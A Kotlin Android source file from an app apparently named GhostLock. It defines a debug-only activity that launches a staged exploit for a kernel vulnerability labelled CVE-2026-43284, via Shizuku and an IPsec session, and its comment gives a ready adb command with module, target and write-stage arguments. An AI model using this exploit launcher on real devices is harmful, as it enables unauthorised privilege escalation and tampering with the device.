package com.ghostlock.app.dev

import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import com.ghostlock.app.BuildConfig
import com.ghostlock.app.data.component.BackendKind
import com.ghostlock.app.data.ipsec.AndroidIpsecSessionFactory
import com.ghostlock.app.data.ipsec.IpsecSession
import com.ghostlock.app.data.ipsec.IpsecSessionResult
import com.ghostlock.app.data.profile.ChannelBStdin
import com.ghostlock.app.domain.model.ShizukuStatus
import com.ghostlock.app.shizuku.ShizukuExploitRunner
import kotlinx.coroutines.runBlocking

/**
 * Explicit, debug-only adb trigger for the staged cve_2026_43284 runner
 * (B5-9d). It is not reachable from the production UI: the activity is
 * disabled unless the debug build enables it, refuses non-debug builds, and
 * requires the EXTRA_CONFIRM boolean extra to be true.
 *
 * adb shell am start -n com.ghostlock.app/.dev.DevCve43284Activity
 *   --ez com.ghostlock.app.extra.DEV_CONFIRM true
 *   --es com.ghostlock.app.extra.MODULE /data/local/tmp/ghostlock-app/helper.ko
 *   --es com.ghostlock.app.extra.TARGET /data/local/tmp/ghostlock-app/target.bin
 *   --es com.ghostlock.app.extra.STAGE write
 *
 * Add --ez com.ghostlock.app.extra.DEV_ALLOW_TARGET true to append the native
 * dev-only --allow-dev-target flag (carrier path prefix relax; default false).
 *
 * Flow: build the transport-mode IpSec SA in this (app) process, then ask the
 * Shizuku UserService to launch
 * --run-cve-2026-43284 <module> <target> --stage=<stage> [--allow-dev-target]
 * and hand the 84-byte channel-B session frame to its stdin. The SA stays
 * installed until the native process exits. Logs go to logcat under TAG.
 */
class DevCve43284Activity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!BuildConfig.DEBUG) {
            log("refusing: not a debug build")
            finish()
            return
        }
        if (!intent.getBooleanExtra(EXTRA_CONFIRM, false)) {
            log("refusing: missing " + EXTRA_CONFIRM + "=true (explicit opt-in required)")
            finish()
            return
        }
        val modulePath = intent.getStringExtra(EXTRA_MODULE).orEmpty()
        val targetPath = intent.getStringExtra(EXTRA_TARGET).orEmpty()
        val stage = intent.getStringExtra(EXTRA_STAGE)?.takeIf { it.isNotEmpty() } ?: "write"
        val allowDevTarget = intent.getBooleanExtra(EXTRA_ALLOW_TARGET, false)
        if (modulePath.isEmpty() || targetPath.isEmpty()) {
            log("refusing: " + EXTRA_MODULE + " and " + EXTRA_TARGET + " are required")
            finish()
            return
        }
        Thread({ runStaged(modulePath, targetPath, stage, allowDevTarget) }, "ghostlock-dev-43284")
            .apply { isDaemon = true }
            .start()
    }

    private fun runStaged(
        modulePath: String,
        targetPath: String,
        stage: String,
        allowDevTarget: Boolean,
    ) {
        var session: IpsecSession? = null
        val runner = ShizukuExploitRunner(applicationContext)
        try {
            val status = runner.status()
            log("Shizuku status=" + status)
            when (status) {
                ShizukuStatus.READY -> Unit
                ShizukuStatus.PERMISSION_REQUIRED -> {
                    runner.requestPermission()
                    log("Shizuku permission requested; grant it and re-run")
                    return
                }
                ShizukuStatus.NOT_RUNNING -> {
                    log("Shizuku is not running")
                    return
                }

                ShizukuStatus.NOT_REQUIRED -> {
                    log("Shizuku is not ready")
                    return
                }
            }
            when (val result = AndroidIpsecSessionFactory(applicationContext).create()) {
                is IpsecSessionResult.Ready -> {
                    session = result.session
                    log("ipsec SA ready (spi/ports present, keys withheld)")
                }

                is IpsecSessionResult.Failure -> {
                    log(
                        "cannot establish ipsec SA: " + result.reason +
                            (result.detail?.let { " (" + it + ")" } ?: ""),
                    )
                    return
                }
            }
            val sessionFrame = requireNotNull(
                ChannelBStdin.sessionFrame(BackendKind.Cve2026_43284, session.secrets),
            ) { "channel-B frame was not produced" }
            val exitCode = runBlocking {
                runner.runStaged43284(modulePath, targetPath, stage, sessionFrame, ::log, allowDevTarget)
            }
            log("staged run finished exit=" + exitCode)
        } catch (error: Throwable) {
            log("error: " + error.message)
        } finally {
            runCatching { session?.close() }
            runCatching { runner.close() }
            runOnUiThread { finish() }
        }
    }

    private fun log(line: String) {
        Log.i(TAG, line)
    }

    companion object {
        const val TAG = "GhostLockDev"
        const val EXTRA_CONFIRM = "com.ghostlock.app.extra.DEV_CONFIRM"
        const val EXTRA_MODULE = "com.ghostlock.app.extra.MODULE"
        const val EXTRA_TARGET = "com.ghostlock.app.extra.TARGET"
        const val EXTRA_STAGE = "com.ghostlock.app.extra.STAGE"
        const val EXTRA_ALLOW_TARGET = "com.ghostlock.app.extra.DEV_ALLOW_TARGET"
    }
}
